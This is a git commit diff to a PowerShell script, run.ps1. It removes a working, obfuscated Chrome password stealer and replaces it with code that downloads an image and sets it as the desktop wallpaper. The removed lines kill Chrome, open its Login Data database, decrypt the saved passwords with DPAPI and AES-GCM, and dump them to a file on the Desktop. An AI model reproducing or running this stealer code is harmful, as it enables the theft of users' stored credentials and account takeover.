d83fea1da8fe6f50ec7d6516f87bf9caadf6e640
Hou <aplazl55@gmail.com>
2022-10-10 07:19:57 +0200

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,38 +1,7 @@
-$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
-
-#Stage 1 Obtain the credentials from the Chrome browsers User Data folder
-
-#First we Kill Chrome just to be safe
-Stop-Process -Name Chrome
-
-$d=Add-Type -A System.Security
-$p='public static'
-$g=""")]$p extern"
-$i='[DllImport("winsqlite3",EntryPoint="sqlite3_'
-$m="[MarshalAs(UnmanagedType.LP"
-$q='(s,i)'
-$f='(p s,int i)'
-$z=$env:LOCALAPPDATA+'\Google\Chrome\User Data'
-$u=[Security.Cryptography.ProtectedData]
-Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
-$s=[W]::O("$z\\Default\\Login Data",[ref]$d)
-$l=@()
-if($host.Version-like"7*"){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
-$x=[Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$_=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0)
-for(;!([W]::S($s)%100)){$l+=[W]::T($s,0),[W]::T($s,3)
-$c=[W]::B($s,5)
-try{$e=$u::Unprotect($c,$n,0)}catch{if($x){$k=$c.length
-$e=[byte[]]::new($k-31)
-$x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_})-join''}
-#After Decrypting the contents of the files, save them to a file in the temp folder.
-
-echo $l >> $env:USERPROFILE\Desktop\$FileName
-
-#Start Chrome again
-
-$pathToChrome = 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
-Start-Process -FilePath $pathToChrome
-
-exit
-
-
+Function Set-WallPaper($Value)
+{
+Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value $value
+rundll32.exe user32.dll, UpdatePerUserSystemParameters
+}
+Invoke-WebRequest -Uri "https://images.squarespace-cdn.com/content/v1/5e269dc38e3cf11eba06a558/1585482069847-M9VWQDJPRBNKW3LRR356/image-asset.jpeg" -OutFile "$env:USERPROFILE\Desktop\wallpaper.bmp"
+Set-WallPaper -value "$env:USERPROFILE\Desktop\wallpaper.bmp"
